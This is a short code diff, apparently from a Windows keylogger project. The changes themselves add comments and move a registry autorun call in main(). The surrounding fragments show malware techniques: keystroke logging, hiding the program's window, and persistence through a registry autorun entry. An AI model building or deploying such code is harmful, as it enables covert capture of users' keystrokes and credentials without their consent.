@@ -24,6 +24,7 @@
 bool is_capslock = false;
 int backspace = 0; 
 
+//Technical task: add handler some not working keys
 int save(const int key)
 {
 	//Write log
@@ -683,6 +684,7 @@ void stealth(const unsigned short int display_mode)
 	ShowWindow(stealth, display_mode); //1 - visible window, 0 - hidden window
 }
 
+//Not working functions
 void addInAutorun()
 {
 	HKEY hKey;
@@ -698,7 +700,7 @@ void addInAutorun()
 		RegSetValueEx(hKey, "", NULL, REG_SZ, (LPBYTE)szPath, strlen(szPath));
 		RegCloseKey(hKey);
 	}
-}
+}   
 
 int main(int argc, char *argv[]) 
 {
@@ -721,10 +723,10 @@ int main(int argc, char *argv[])
 		exit(1);
 	}
 
+	addInAutorun();
+
 	char buffer[MAX_PATH];
 	::GetModuleFileNameA(NULL, buffer, MAX_PATH);
-
-	addInAutorun();
 
 	char i;
 	while (true) 
